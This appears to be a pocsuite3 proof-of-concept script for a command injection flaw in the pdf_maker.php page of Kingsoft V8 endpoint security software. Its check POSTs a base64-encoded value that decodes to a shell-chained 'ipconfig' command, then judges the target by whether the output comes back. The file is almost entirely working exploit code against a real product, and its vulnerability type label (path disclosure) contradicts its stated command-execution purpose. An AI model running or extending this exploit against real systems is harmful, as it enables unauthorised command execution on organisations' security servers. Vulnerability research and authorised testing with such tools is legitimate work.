from lib2to3.pgen2 import token
from pocsuite3.lib.core.data import logger
from collections import OrderedDict
from urllib.parse import urljoin
from requests.exceptions import ReadTimeout
from pocsuite3.api import get_listener_ip, get_listener_port, random_str
from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, REVERSE_PAYLOAD, OptString, OptItems, OptDict, VUL_TYPE
from pocsuite3.lib.utils import get_middle_text
from requests.packages.urllib3.exceptions import InsecureRequestWarning

class DemoPOC(POCBase):
    vulID = '8'  
    name = '金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞'
    desc = '''金山 V8 终端安全系统 pdf_maker.php 命令执行漏洞'''
    appPowerLink = '金山 V8 终端安全系统'
    appName = '金山 V8'
    appVersion = '*'
    samples = []
    install_requires = ['']
    vulType = VUL_TYPE.PATH_DISCLOSURE
    category = POC_CATEGORY.EXPLOITS.WEBAPP


    def _verify(self):
        result = {}
        target = self.url + "/inter/pdf_maker.php"
        headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
        }
        data = "url=IiB8fCBpcGNvbmZpZyB8fA==&fileName=xxx"

        try:
            r = requests.post(target, timeout=5, data=data, verify=False)
            if "Windows" in r.text and r.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
        except:
            pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)